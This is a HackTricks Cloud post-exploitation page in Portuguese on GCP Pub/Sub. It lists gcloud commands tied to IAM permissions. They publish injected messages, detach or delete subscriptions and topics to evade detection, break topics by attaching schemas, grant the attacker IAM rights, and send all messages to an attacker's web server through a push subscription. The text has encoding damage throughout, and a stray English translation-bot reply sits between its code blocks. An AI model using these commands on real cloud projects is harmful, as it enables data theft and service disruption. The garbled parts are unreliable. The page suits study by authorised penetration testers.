# GCP - P√≥s-Explora√ß√£o Pub/Sub

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Pub/Sub

Para mais informa√ß√µes sobre Pub/Sub, consulte a seguinte p√°gina:

{% content-ref url="../gcp-services/gcp-pub-sub.md" %}
[gcp-pub-sub.md](../gcp-services/gcp-pub-sub.md)
{% endcontent-ref %}

### `pubsub.topics.publish`

Publicar uma mensagem em um t√≥pico, √∫til para **enviar dados inesperados** e acionar funcionalidades inesperadas ou explorar vulnerabilidades:
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```
### `pubsub.topics.detachSubscription`

√ötil para impedir que uma assinatura receba mensagens, talvez para evitar detec√ß√£o.
```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```
### `pubsub.topics.delete`

√ötil para impedir que uma assinatura receba mensagens, talvez para evitar detec√ß√£o.\
√â poss√≠vel deletar um t√≥pico mesmo com assinaturas vinculadas a ele.
```bash
gcloud pubsub topics delete <TOPIC NAME>
```
### `pubsub.topics.update`

Utilize esta permiss√£o para atualizar algumas configura√ß√µes do t√≥pico para interromp√™-lo, como `--clear-schema-settings`, `--message-retention-duration`, `--message-storage-policy-allowed-regions`, `--schema`, `--schema-project`, `--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

Conceda a si mesmo permiss√£o para realizar qualquer um dos ataques anteriores.

### **pubsub.subscriptions.create**, **`pubsub.topics.attachSubscription`**, (`pubsub.subscriptions.consume`)

Obtenha todas as mensagens em um servidor web:

{% code overflow="wrap" %}
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
{% endcode %}

Crie uma assinatura e use-a para **puxar mensagens**:
```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```
### `pubsub.subscriptions.delete`

**Excluir uma assinatura** pode ser √∫til para interromper um sistema de processamento de logs ou algo semelhante:
```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```
### &#x20;`pubsub.subscriptions.update`

Use essa permiss√£o para atualizar algumas configura√ß√µes para que as mensagens sejam armazenadas em um local ao qual voc√™ possa acessar (URL, tabela Big Query, Bucket) ou apenas para interromp√™-lo.

### `pubsub.subscriptions.setIamPolicy`

Conceda a si mesmo as permiss√µes necess√°rias para realizar qualquer um dos ataques anteriormente comentados.

### `pubsub.schemas.delete`

Exclua um esquema para poder enviar mensagens que n√£o atendam ao esquema:
```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```
### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

Ataque um esquema a um t√≥pico para que as mensagens n√£o o cumpram e, portanto, o t√≥pico seja interrompido.\
Se n√£o houver nenhum esquema, voc√™ pode precisar criar um.

{% code title="schema.json" %}
```json
{
"namespace": "com.example",
"type": "record",
"name": "Person",
"fields": [
{
"name": "name",
"type": "string"
},
{
"name": "age",
"type": "int"
}
]
}
```
Since the provided text does not contain any English text to be translated, there is no translation to provide. If you have specific English text that you would like translated into Portuguese, please provide the text, and I will be happy to assist.
```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
--schema=projects/<project-name>/schemas/<topic-id> \
--message-encoding=json
```
### `pubsub.schemas.setIamPolicy`

Conceda a si mesmo as permiss√µes necess√°rias para realizar qualquer um dos ataques anteriormente comentados.

### `pubsub.snapshots.create`, `pubsub.snapshots.seek`

Isso criar√° um snapshot de todas as mensagens n√£o confirmadas e as colocar√° de volta na assinatura. N√£o √© muito √∫til para um atacante, mas aqui est√°:
```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
--subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
--snapshot=YOUR_SNAPSHOT_NAME
```
<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
